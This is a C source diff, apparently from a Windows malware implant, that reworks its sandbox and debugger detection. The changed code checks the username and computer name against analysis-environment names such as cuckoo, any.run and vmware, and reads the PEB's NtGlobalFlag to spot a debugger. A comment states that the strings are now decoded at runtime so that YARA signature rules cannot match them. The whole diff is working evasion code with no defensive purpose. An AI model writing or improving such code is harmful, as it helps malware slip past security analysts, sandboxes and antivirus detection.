@@ -91,6 +91,7 @@
 #include "peb_walk.h"
 #include "syscall.h"
 #include "obf.h"
+#include "nt_offsets.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -309,24 +310,18 @@ static BOOL _check_sandbox_modules(void)
  *   VMRay:                 "analyst"
  *   Common AD test names:  "test", "testuser", "malware", "virus", "sample"
  *   Known dummy names:     "7man" (used by some automated tools)
+ *
+ * All string literals are decoded via SLIT_BUF at runtime so that the
+ * contiguous cluster "sandbox\0malware\0virus\0cuckoo..." does not appear
+ * in .rdata and cannot be matched by a simple YARA strings rule.
+ *
+ * _check_suspicious_identity() decodes each name into a local stack buffer
+ * just before comparison and zeros it immediately after.
  */
 
-/* Candidate suspicious names — all lowercase for comparison */
-static const char * const _sb_usernames[] = {
-    "user",      "sandbox",  "malware",  "virus",
-    "cuckoo",    "analyst",  "maltest",  "test",
-    "testuser",  "sample",   "john",     "peter",
-    "7man",      "admin",
-};
-#define _SB_USERNAME_COUNT  (sizeof(_sb_usernames)/sizeof(_sb_usernames[0]))
-
-static const char * const _sb_hostnames[] = {
-    "sandbox",  "malware",  "virus",   "cuckoo",
-    "analysis", "analyst",  "test",    "maltest",
-    "sample",   "vmware",   "vbox",    "qemu",
-    "triage",   "any.run",  "joebox",
-};
-#define _SB_HOSTNAME_COUNT  (sizeof(_sb_hostnames)/sizeof(_sb_hostnames[0]))
+/* No static arrays — strings decoded inline in _check_suspicious_identity */
+#define _SB_USERNAME_COUNT  14
+#define _SB_HOSTNAME_COUNT  15
 
 /* Portable tolower for ASCII — no CRT locale */
 static inline int _sb_tolower(int c)
@@ -358,26 +353,65 @@ static BOOL _check_suspicious_identity(void)
 {
     char name[128] = {0};
     DWORD nlen = sizeof(name) - 1;
+    char _n[32];
+    BOOL found = FALSE;
+
+#define _SB_UCHECK(s) do { \
+    SLIT_BUF(_n, sizeof(_n), s); \
+    if (_sb_icontains(name, _n)) { SecureZeroMemory(_n, sizeof(_n)); found = TRUE; goto _sb_id_done; } \
+    SecureZeroMemory(_n, sizeof(_n)); \
+} while(0)
+
+#define _SB_HCHECK(s) do { \
+    SLIT_BUF(_n, sizeof(_n), s); \
+    if (_sb_icontains(name, _n)) { SecureZeroMemory(_n, sizeof(_n)); found = TRUE; goto _sb_id_done; } \
+    SecureZeroMemory(_n, sizeof(_n)); \
+} while(0)
 
     /* Username */
     if (GetUserNameA(name, &nlen)) {
-        for (int i = 0; i < (int)_SB_USERNAME_COUNT; i++) {
-            if (_sb_icontains(name, _sb_usernames[i]))
-                return TRUE;
-        }
+        _SB_UCHECK("user");
+        _SB_UCHECK("sandbox");
+        _SB_UCHECK("malware");
+        _SB_UCHECK("virus");
+        _SB_UCHECK("cuckoo");
+        _SB_UCHECK("analyst");
+        _SB_UCHECK("maltest");
+        _SB_UCHECK("test");
+        _SB_UCHECK("testuser");
+        _SB_UCHECK("sample");
+        _SB_UCHECK("john");
+        _SB_UCHECK("peter");
+        _SB_UCHECK("7man");
+        _SB_UCHECK("admin");
     }
 
     /* Computer name */
     nlen = sizeof(name) - 1;
     memset(name, 0, sizeof(name));
     if (GetComputerNameA(name, &nlen)) {
-        for (int i = 0; i < (int)_SB_HOSTNAME_COUNT; i++) {
-            if (_sb_icontains(name, _sb_hostnames[i]))
-                return TRUE;
-        }
+        _SB_HCHECK("sandbox");
+        _SB_HCHECK("malware");
+        _SB_HCHECK("virus");
+        _SB_HCHECK("cuckoo");
+        _SB_HCHECK("analysis");
+        _SB_HCHECK("analyst");
+        _SB_HCHECK("test");
+        _SB_HCHECK("maltest");
+        _SB_HCHECK("sample");
+        _SB_HCHECK("vmware");
+        _SB_HCHECK("vbox");
+        _SB_HCHECK("qemu");
+        _SB_HCHECK("triage");
+        _SB_HCHECK("any.run");
+        _SB_HCHECK("joebox");
     }
 
-    return FALSE;
+#undef _SB_UCHECK
+#undef _SB_HCHECK
+
+_sb_id_done:
+    return found;
 }
 
 
@@ -445,11 +479,10 @@ static BOOL _check_debugger(void)
     PVOID peb_ptr;
 #ifdef _WIN64
     __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr));
-    DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr + 0xBC);
 #else
     __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
-    DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr + 0x68);
 #endif
+    DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr + PEB_NtGlobalFlag);
     if ((ntgf & 0x70) == 0x70) return TRUE;
 
     /* c) NtQueryInformationProcess(ProcessDebugPort) */
